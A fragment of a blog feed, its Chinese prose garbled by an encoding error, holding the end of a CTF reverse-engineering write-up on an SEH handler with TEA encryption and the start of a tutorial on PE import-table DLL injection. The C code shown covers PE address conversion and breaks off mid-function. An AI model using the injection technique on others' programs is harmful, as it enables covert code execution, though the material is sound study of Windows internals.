class="hljs-number">005E183</span>B mov     eax, ___security_cookie<br>.text:<span class="hljs-number">005E1840</span> xor     eax, ebp<br>.text:<span class="hljs-number">005E1842</span> mov     [ebp+var_4], eax<br>.text:<span class="hljs-number">005E1845</span> mov     [ebp+var_C], offset sub_5E12FD<br>.text:<span class="hljs-number">005E184</span>C push    [ebp+var_C]<br>.text:<span class="hljs-number">005E184</span>F push    large dword ptr fs:<span class="hljs-number">0</span><br>.text:<span class="hljs-number">005E1856</span> mov     large fs:<span class="hljs-number">0</span>, esp<br>.text:<span class="hljs-number">005E185</span>D <span class="hljs-type">int</span>     <span class="hljs-number">3</span>               ; Trap to Debugger<br>.text:<span class="hljs-number">005E185</span>E mov     eax, [esp+<span class="hljs-number">0E4</span>h+var_E4]<br>.text:<span class="hljs-number">005E1861</span> mov     large fs:<span class="hljs-number">0</span>, eax<br>.text:<span class="hljs-number">005E1867</span> add     esp, <span class="hljs-number">8</span><br>.text:<span class="hljs-number">005E186</span>A pop     edi<br>.text:<span class="hljs-number">005E186</span>B pop     esi<br>.text:<span class="hljs-number">005E186</span>C pop     ebx<br>.text:<span class="hljs-number">005E186</span>D mov     ecx, [ebp+var_4]<br>.text:<span class="hljs-number">005E1870</span> xor     ecx, ebp        ; StackCookie<br>.text:<span class="hljs-number">005E1872</span> call    j_@__security_check_cookie@<span class="hljs-number">4</span> ; __security_check_cookie(x)<br>.text:<span class="hljs-number">005E1877</span> add     esp, <span class="hljs-number">0</span>D0h<br>.text:<span class="hljs-number">005E187</span>D cmp     ebp, esp<br>.text:<span class="hljs-number">005E187</span>F call    j___RTC_CheckEsp<br>.text:<span class="hljs-number">005E1884</span> mov     esp, ebp<br>.text:<span class="hljs-number">005E1886</span> pop     ebp<br>.text:<span class="hljs-number">005E1887</span> retn<br></code></pre></td></tr></table></figure><p>â€‹è®©æˆ‘ä»¬æŠŠç›®å…‰é›†ä¸­åˆ°åœ°å€5E1845å¤„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">005E1845</span> mov     [ebp+var_C], offset sub_5E12FD<br>.text:<span class="hljs-number">005E184</span>C push    [ebp+var_C]<br>.text:<span class="hljs-number">005E184</span>F push    large dword ptr fs:<span class="hljs-number">0</span><br>.text:<span class="hljs-number">005E1856</span> mov     large fs:<span class="hljs-number">0</span>, esp<br>.text:<span class="hljs-number">005E185</span>D <span class="hljs-type">int</span>     <span class="hljs-number">3</span>               ; Trap to Debugger<br></code></pre></td></tr></table></figure><p>â€‹è¿™å‡ å¥æ±‡ç¼–æ˜¯å¦è§‰å¾—å¾ˆç†Ÿæ‚‰ï¼Œè¿™ä¸å°±æ˜¯SEHå®‰è£…æµç¨‹å˜›ï¼ã€‚å…ˆå›è°ƒå‡½æ•°å‹æ ˆï¼Œå†å‹å…¥å½“å‰çš„<code>fs:[0]</code>ï¼Œç„¶åå†å°†ä¸Šä¸€ä¸ªSEHåœ°å€å­˜å‚¨åˆ°<code>fs:[0]</code>ï¼Œæœ€åå¼•å‘ä¸€ä¸ªæ–­ç‚¹å¼‚å¸¸ï¼Œæ‰€ä»¥æ­¤æ—¶å…³é”®å°±æ˜¯é‚£ä¸ªå›è°ƒå‡½æ•°<code>sub_5E12FD</code></p><p>â€‹ç°åœ¨å°±æ¥åˆ†æä¸€ä¸‹è¿™ä¸ªå›è°ƒå‡½æ•°å§</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">005E1</span>B50 push    ebp<br>.text:<span class="hljs-number">005E1</span>B51 mov     ebp, esp<br>.text:<span class="hljs-number">005E1</span>B53 sub     esp, <span class="hljs-number">0</span>C0h<br>.text:<span class="hljs-number">005E1</span>B59 push    ebx<br>.text:<span class="hljs-number">005E1</span>B5A push    esi<br>.text:<span class="hljs-number">005E1</span>B5B push    edi<br>.text:<span class="hljs-number">005E1</span>B5C mov     edi, ebp<br>.text:<span class="hljs-number">005E1</span>B5E xor     ecx, ecx<br>.text:<span class="hljs-number">005E1</span>B60 mov     eax, <span class="hljs-number">0</span>CCCCCCCCh<br>.text:<span class="hljs-number">005E1</span>B65 rep stosd<br>.text:<span class="hljs-number">005E1</span>B67 mov     ecx, offset unk_5EC063<br>.text:<span class="hljs-number">005E1</span>B6C call    j_@__CheckForDebuggerJustMyCode@<span class="hljs-number">4</span> ; __CheckForDebuggerJustMyCode(x)<br>.text:<span class="hljs-number">005E1</span>B71 push    offset aDx3906  ; <span class="hljs-string">&quot;DX3906&quot;</span><br>.text:<span class="hljs-number">005E1</span>B76 push    offset dword_5EA598<br>.text:<span class="hljs-number">005E1</span>B7B call    enc<br>.text:<span class="hljs-number">005E1</span>B80 add     esp, <span class="hljs-number">8</span><br>.text:<span class="hljs-number">005E1</span>B83 push    offset aDoctor3 ; <span class="hljs-string">&quot;doctor3&quot;</span><br>.text:<span class="hljs-number">005E1</span>B88 push    offset unk_5EA5A0<br>.text:<span class="hljs-number">005E1</span>B8D call    enc<br>.text:<span class="hljs-number">005E1</span>B92 add     esp, <span class="hljs-number">8</span><br>.text:<span class="hljs-number">005E1</span>B95 push    offset aFux1aoyun ; <span class="hljs-string">&quot;FUX1AOYUN&quot;</span><br>.text:<span class="hljs-number">005E1</span>B9A push    offset unk_5EA5A8<br>.text:<span class="hljs-number">005E1</span>B9F call    enc<br>.text:<span class="hljs-number">005E1</span>BA4 add     esp, <span class="hljs-number">8</span><br>.text:<span class="hljs-number">005E1</span>BA7 push    offset aR3verier ; <span class="hljs-string">&quot;R3verier&quot;</span><br>.text:<span class="hljs-number">005E1</span>BAC push    offset dword_5EA5B0<br>.text:<span class="hljs-number">005E1</span>BB1 call    enc<br>.text:<span class="hljs-number">005E1</span>BB6 add     esp, <span class="hljs-number">8</span><br>.text:<span class="hljs-number">005E1</span>BB9 mov     eax, <span class="hljs-number">1</span><br>.text:<span class="hljs-number">005E1</span>BBE pop     edi<br>.text:<span class="hljs-number">005E1</span>BBF pop     esi<br>.text:<span class="hljs-number">005E1</span>BC0 pop     ebx<br>.text:<span class="hljs-number">005E1</span>BC1 add     esp, <span class="hljs-number">0</span>C0h<br>.text:<span class="hljs-number">005E1</span>BC7 cmp     ebp, esp<br>.text:<span class="hljs-number">005E1</span>BC9 call    j___RTC_CheckEsp<br>.text:<span class="hljs-number">005E1</span>BCE mov     esp, ebp<br>.text:<span class="hljs-number">005E1</span>BD0 pop     ebp<br>.text:<span class="hljs-number">005E1</span>BD1 retn<br></code></pre></td></tr></table></figure><p>â€‹è¿™ä¸ªå¤„ç†å‡½æ•°æ‰€æ‰§è¡Œçš„æ“ä½œä¹Ÿæ˜¯TEAåŠ å¯†ï¼Œä½†æ˜¯æˆ‘ä»¬å…³æ³¨æœ€åçš„è¿”å›å€¼æ˜¯1ï¼Œä¹Ÿå³<code>ExceptionContinueSearch</code>ï¼Œä¹Ÿå°±æ˜¯è¯´æ“ä½œç³»ç»Ÿè®¤ä¸ºè¿™ä¸ªå¤„ç†å‡½æ•°æ²¡æœ‰çœŸæ­£å¤„ç†å¼‚å¸¸ï¼Œè¿™å°±éœ€è¦å‘å¤–å»æ‰¾<code>__except</code>å—ä»£ç æ¥å¤„ç†ï¼Œä½†æ˜¯åœ¨è°ƒç”¨<code>__except</code>ä¹‹å‰ï¼Œæ“ä½œç³»ç»Ÿè¿˜ä¼šå†è°ƒç”¨ä»¥ä¸€æ¬¡è¿™ä¸ªå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¹‹å‰æåŠçš„å±•å¼€ï¼Œå¯ä»¥æŠŠä¸€æ®µä»£ç ä¸åˆæ¢å±•å¼€çš„ä»£ç æ¯”è¾ƒï¼Œä¼šå‘ç°æœ‰å¼‚æ›²åŒå·¥ä¹‹å¦™ã€‚æ‰€ä»¥è¿™ä¸€å—æ¶‰åŠçš„å¯†æ–‡éœ€è¦ä¸¤æ¬¡TEAè§£å¯†ï¼Œè¿™ä¹Ÿæ˜¯æ­¤é¢˜çœŸæ­£çš„è€ƒç‚¹ã€‚</p><p>â€‹åç»­çš„å†…å®¹éƒ½æ¯”è¾ƒç®€å•äº†ï¼Œå°±æ˜¯æ¯”è¾ƒå¯†æ–‡ï¼Œç›¸åŒå³å¯å¾—åˆ°flagï¼Œåªè¦æŒ‰éƒ¨å°±ç­æ ¹æ®TEAè§£å¯†å°±è¡Œäº†ï¼Œä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ååŠéƒ¨åˆ†çš„flagéœ€è¦ä¸¤æ¬¡TEAè§£å¯†ï¼Œè€Œä¸”TEAä½¿ç”¨çš„Kæ•°ç»„æ˜¯DWORDå‹çš„ã€‚</p><p>â€‹å®Œç»“ï¼</p><p>å‚è€ƒèµ„æ–™ï¼š</p><p>1.ã€ŠåŠ å¯†ä¸è§£å¯†ã€‹â€”â€” Windowsä¸‹å¼‚å¸¸å¤„ç†</p><p>2.<a href="https://blog.csdn.net/chenlycly/article/details/52575260?ydreferer=aHR0cHM6Ly93d3cuYmluZy5jb20v">æ·±å…¥è§£æç»“æ„åŒ–å¼‚å¸¸</a></p><p>3.ã€Šé€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†ã€‹â€”â€” SEHéƒ¨åˆ†</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>SEH</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>SEH</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PEæ–‡ä»¶ç»“æ„ï¼ˆENDï¼‰</title>
    <link href="/2023/07/25/PE_10/"/>
    <url>/2023/07/25/PE_10/</url>
    
    <content type="html"><![CDATA[<p>å¯¼å…¥è¡¨æ³¨å…¥</p><span id="more"></span><h2 id="å›é¡¾"><a href="#å›é¡¾" class="headerlink" title="å›é¡¾"></a>å›é¡¾</h2><p>å¯¼å…¥è¡¨çš„æ„ä¹‰æ˜¯å‘Šè¯‰æ“ä½œç³»ç»Ÿæˆ‘éœ€è¦ä½¿ç”¨å…¶ä»–PEæä¾›çš„ä»€ä¹ˆå‡½æ•°ï¼Œç„¶åæ“ä½œç³»ç»Ÿå°±ä¼šå¸®å¿™æŠŠè¿™äº›DLLç»™åŠ è½½è¿›æ­¤4GBç©ºé—´ä¸­ã€‚å¯¼å…¥è¡¨é‡Œé¢åˆæœ‰ä¸¤å¼ è¡¨ï¼Œåˆ†åˆ«æ˜¯INTè¡¨å’ŒIATè¡¨ï¼Œä¸¤è€…åœ¨åŠ è½½å‰çš„å†…å®¹å®Œå…¨ç›¸åŒï¼Œåœ¨åŠ è½½æ—¶IATè¡¨åˆ™ä¼šå‘ç”Ÿå˜åŒ–ï¼Œä¼šæ›´æ”¹ä¸ºå‡½æ•°åœ°å€ã€‚</p><h2 id="æ³¨å…¥"><a href="#æ³¨å…¥" class="headerlink" title="æ³¨å…¥"></a>æ³¨å…¥</h2><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>åœ¨æ“ä½œç³»ç»ŸåŠ è½½DLLæ—¶ï¼Œä¼šè‡ªåŠ¨æ‰§è¡ŒDLLæœ¬èº«çš„å‡½æ•°</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307252357875.png"></p><p>æ¯”å¦‚è¿™é‡Œswitchä¸­çš„DLL_PROCESS_ATTACH,ä¹Ÿå³æ“ä½œç³»ç»Ÿåœ¨åŠ è½½æ­¤DLLæ—¶ä¼šè‡ªåŠ¨æ‰§è¡Œè¿™ä¸ªåˆ†æ”¯é‡Œçš„è¯­å¥ï¼Œè€Œæ“ä½œç³»ç»Ÿåˆæ˜¯æ ¹æ®å¯¼å…¥è¡¨æ¥åŠ è½½DLLçš„ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç”±æ­¤åˆ¶ä½œä¸€ä¸ªDLLï¼Œåœ¨æ­¤åˆ†æ”¯é‡Œé¢æ‰§è¡Œæƒ³è¦çš„æ“ä½œï¼Œåœ¨åŠ è½½æ—¶å°±ä¼šè‡ªåŠ¨æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æŸç§ç›®çš„ã€‚</p><p>æ¢å¥è¯è¯´ï¼Œæˆ‘ä»¬éœ€è¦äººä¸ºåœ¨å¯¼å…¥è¡¨é‡Œæ·»åŠ ä¸€é¡¹DLLï¼Œæ¥éª—è¿‡æ“ä½œç³»ç»Ÿã€‚ä½†æ˜¯ä¼šé¢ä¸´ä¸€ä¸ªé—®é¢˜ï¼Œå³åŸæ¥çš„å¯¼å…¥è¡¨ä¸å¤Ÿä½ç½®ï¼Œå› ä¸ºæ“ä½œç³»ç»Ÿæ˜¯æ ¹æ®å¯¼å…¥è¡¨æœ€åçš„å…¨0ç»“æ„æ¥åˆ¤æ–­æ˜¯å¦å¯¼å…¥è¡¨æ˜¯å¦ç»“æŸï¼Œå¦‚æœè¯´åŸæ¥çš„å¯¼å…¥è¡¨åé¢åªæœ‰20ä¸ªé›¶ï¼ˆä¸€ä¸ªå¯¼å…¥è¡¨ç»“æ„çš„å¤§å°ï¼‰ï¼Œé‚£ä¹ˆæ˜¾ç„¶æ˜¯ä¸èƒ½åœ¨æ­¤åŸºç¡€ä¸Šæ·»åŠ å¯¼å…¥è¡¨çš„ï¼Œå› ä¸ºè¿™æ ·å°±ä¼šåŠ è½½è¿›é”™è¯¯çš„å¯¼å…¥è¡¨ï¼Œä»è€Œå¯¼è‡´ç¨‹åºå´©æºƒã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬éœ€è¦ç§»åŠ¨å¯¼å…¥è¡¨ï¼</p><h3 id="ç§»åŠ¨å¯¼å…¥è¡¨"><a href="#ç§»åŠ¨å¯¼å…¥è¡¨" class="headerlink" title="ç§»åŠ¨å¯¼å…¥è¡¨"></a>ç§»åŠ¨å¯¼å…¥è¡¨</h3><p>ç§»åŠ¨æœ€å¥½çš„æ–¹å¼æ˜¯æ–°å¼€ä¸€ä¸ªèŠ‚ï¼Œç„¶åæ ¹æ®ç›®å½•é¡¹å¼€å§‹é€è¡¨é€è¡¨copyï¼Œä½ å¯èƒ½æœ‰ä¸€ä¸ªç–‘é—®â€”â€”ä¸ºä»€ä¹ˆè¦é€è¡¨ï¼Œè€Œä¸ç›´æ¥ä½¿ç”¨ç›®å½•é¡¹çš„sizeæˆå‘˜å‘¢ï¼ŸåŸå› æœ‰äºŒï¼Œç¬¬ä¸€è¿™ä¸ªsizeæ˜¯ä¸å‡†ç¡®çš„ï¼Œåœ¨è®¸å¤šç¼–è¯‘å™¨ä¸­éƒ½ä¼šå°†æ­¤å€¼ç½®0ï¼Œä½ ä¹Ÿå¯ä»¥è‡ªå·±æŠŠå®ƒè®¾ç½®æˆ0ï¼Œç¨‹åºä¸€æ ·å¯ä»¥æ­£å¸¸è¿è¡Œï¼›ç¬¬äºŒè¿™ä¸ªsizeå¯èƒ½ä¸åªåŒ…å«å¯¼å…¥è¡¨ï¼Œè¿˜å¯èƒ½åŒ…å«äº†INTè¡¨ï¼ŒIATè¡¨ç­‰æ‰€æœ‰çš„å¤§å°ï¼Œä½†æ˜¯æˆ‘ä»¬åªæƒ³copyå•çº¯çš„å¯¼å…¥è¡¨ã€‚</p><p>å› æ­¤éœ€è¦é€è¡¨é€è¡¨copyï¼Œç„¶åç”¨20å­—èŠ‚æ¥åšæ–°è¡¨çš„å¤§å°ï¼Œå†ç”¨20å­—èŠ‚åšç»“æŸçš„æ ‡å¿—</p><h3 id="æ–°å¢INTè¡¨ã€IATè¡¨"><a href="#æ–°å¢INTè¡¨ã€IATè¡¨" class="headerlink" title="æ–°å¢INTè¡¨ã€IATè¡¨"></a>æ–°å¢INTè¡¨ã€IATè¡¨</h3><p>ä»…ä»…åˆ›å»ºæ–°è¡¨æ˜¯ä¸å¤Ÿçš„ï¼Œå› æ­¤æ­¤æ—¶è¡¨ç»“æ„å…¨ä¸º0ï¼Œå³ä½¿è®¾ç½®äº†DLLçš„åå­—ã€‚å› ä¸ºæ“ä½œç³»ç»Ÿä¼šçœ‹è¿™ä¸ªè¡¨çš„INTè¡¨ã€IATè¡¨ï¼Œå¦‚æœè¿™ä¸¤å¼ è¡¨ä¸º0ï¼Œå°±è¯´æ˜æ²¡æœ‰ç”¨åˆ°è¿™ä¸ªDLLï¼Œå°±ä¸ä¼šæŠŠä»–åŠ è½½ç¨‹åº4GBç©ºé—´ã€‚å› æ­¤éœ€è¦æ–°å¢INTè¡¨ã€IATè¡¨ï¼Œæˆ‘ä»¬åªéœ€è¦æ–°å¢ä¸€é¡¹å°±å¯ä»¥ä½¿å¾—æ“ä½œç³»ç»ŸåŠ è½½DLLäº†ã€‚</p><p>åŒç†INTè¡¨ã€IATè¡¨ä¹Ÿéœ€è¦å…¨é›¶0ç»“æ„ä½œä¸ºç»“æŸï¼Œè€Œè¿™ä¸¤å¼ è¡¨è¡¨é¡¹å¤§å°æ˜¯4å­—èŠ‚ï¼Œå› æ­¤æ¯ä¸€å¼ è¡¨éƒ½éœ€è¦8å­—èŠ‚æ¥å®Œæˆæ–°å¢æ“ä½œã€‚æ­¤åå°±æ˜¯è®¾ç½®è¿™ä¸¤å¼ è¡¨çš„è¡¨é¡¹ï¼Œä½¿å…¶æŒ‡å‘PIMAGE_IMPORT_BY_NAMEç»“æ„ï¼ˆå½“ç„¶ä½¿ç”¨åºå·çš„æ–¹å¼ä¹Ÿæ˜¯å¯ä»¥çš„ï¼‰</p><p>ç®€å•æ¥è¯´ï¼Œå°±æ˜¯é‡æ–°æ„è¿™å‡ å¼ è¡¨çš„æŒ‡å‘å…³ç³»ï¼Œä¹Ÿå°±æ˜¯å¦‚å›¾çš„æ‰€æœ‰ç®­å¤´</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307260019297.png"></p><p>åªè¦é‡æ–°å»ºç«‹è¿™äº›ç®­å¤´æŒ‡å‘ï¼Œä¹Ÿå°±ä»£è¡¨ä¸€ä¸ªæ–°çš„å¯¼å…¥è¡¨æˆåŠŸå»ºç«‹</p><p>æ³¨å…¥æˆåŠŸæ ‡å¿—å°±æ˜¯åœ¨åŒå‡»è¿è¡Œexeæ—¶ï¼Œä¼šæ‰§è¡Œæ³¨å…¥DLLé‡Œçš„DLL_PROCESS_ATTACHåˆ†æ”¯é‡Œçš„è¯­å¥ï¼Œåœ¨æœ¬ä¾‹ä¸­å°±æ˜¯ç®€å•å¼¹ä¸€ä¸ªçª—ï¼Œåœ¨ç»“æŸè¿è¡Œæ—¶åˆ™æ˜¯è¿è¡ŒDLL_PROCESS_DETACHåˆ†æ”¯é‡Œçš„è¯­å¥ï¼Œä¹Ÿæ˜¯å¼¹ä¸€ä¸ªçª—ã€‚</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307260029222.png"></p><h3 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h3><p>å¤šè¯´æ— ç›Šï¼Œç›´æ¥çœ‹ä»£ç </p><p>NOTEï¼šè¦æ³¨å…¥çš„ç¨‹åºå¦‚æœæ˜¯32ä½ï¼Œåˆ™åªèƒ½ä½¿ç”¨32ä½çš„DLLï¼›</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ADD_SIZE 0x3000</span><br><br>DWORD <span class="hljs-title function_">Size</span><span class="hljs-params">(FILE* fp)</span>&#123;<br>    DWORD size = <span class="hljs-number">0</span>;<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_END);<br>    size = ftell(fp);<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_SET);<br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br>DWORD <span class="hljs-title function_">RVA_TO_FOA</span><span class="hljs-params">(DWORD RVA,<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>   PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FileHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER32 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    FileHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER32)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br>    <br>    <span class="hljs-keyword">if</span> (RVA &lt; OptionalHeader-&gt;SizeOfHeaders)<br>&#123;<br><span class="hljs-keyword">return</span> RVA;<br>&#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;FileHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(RVA &gt;= SectionHeader-&gt;VirtualAddress &amp;&amp; RVA &lt; (SectionHeader+<span class="hljs-number">1</span>)-&gt;VirtualAddress)&#123;<br>            DWORD offset = RVA - SectionHeader-&gt;VirtualAddress;<br>            <span class="hljs-keyword">return</span> SectionHeader-&gt;PointerToRawData + offset;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            SectionHeader +=<span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br><br>     <span class="hljs-comment">//æœ€åä¸€ä¸ªèŠ‚åŒº</span><br>    DWORD offset = RVA - SectionHeader-&gt;VirtualAddress;<br>    <span class="hljs-keyword">return</span> SectionHeader-&gt;PointerToRawData + offset;<br>&#125;<br><br>DWORD <span class="hljs-title function_">FOA_TO_RVA</span><span class="hljs-params">(DWORD FOA,<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>   PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER FileHeader= <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    FileHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>    OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> +IMAGE_SIZEOF_FILE_HEADER);<br>    SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + 